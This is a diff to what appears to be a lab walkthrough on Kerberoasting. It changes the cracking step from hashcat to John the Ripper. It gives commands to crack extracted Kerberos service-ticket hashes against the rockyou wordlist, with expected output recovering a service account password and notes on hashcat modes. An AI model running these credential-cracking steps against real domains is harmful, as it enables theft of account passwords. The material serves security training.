@@ -83,25 +83,27 @@ those tickets offline to recover the service accounts' plaintext passwords.
     ls -lh /usr/share/wordlists/rockyou.txt
     ```
 
-1. Crack the extracted ticket hashes offline with **hashcat** (mode `13100` = Kerberos 5
-   TGS-REP RC4).
+1. Crack the extracted ticket hashes offline with **John the Ripper** (CPU-based, and it
+   auto-detects the ticket type — no GPU/OpenCL needed, which suits a cloud VM).
 
     ```bash
-    hashcat -m 13100 /tmp/kerberoast.txt /usr/share/wordlists/rockyou.txt --force
-    ```
-
-    Then show the cracked results:
-
-    ```bash
-    hashcat -m 13100 /tmp/kerberoast.txt /usr/share/wordlists/rockyou.txt --show
+    john /tmp/kerberoast.txt --wordlist=/usr/share/wordlists/rockyou.txt
+    john --show /tmp/kerberoast.txt
     ```
 
     **Expected Output:** one or more service accounts crack — e.g. `svc.web` recovers to
     **`Password1`** (others such as `svc.mssql`, `svc.sccm`, `svc.sql` may also crack):
 
     ```output
-    $krb5tgs$23$*svc.web$CORP.LOCAL$...:Password1
+    Password1        (?)
+    ...
+    $krb5tgs$...:Password1
     ```
+
+    > **Using hashcat instead?** hashcat needs an OpenCL/CUDA backend. On a GPU-less cloud VM,
+    > install the CPU runtime first (`sudo apt install -y pocl-opencl-icd`), then use the mode
+    > matching the ticket type: `-m 13100` for RC4 (`$krb5tgs$23$`) or `-m 19700` for AES256
+    > (`$krb5tgs$18$`). John avoids this by auto-detecting.
 
 1. Confirm the recovered service-account credential is valid on the domain (here against the
    MSSQL server).
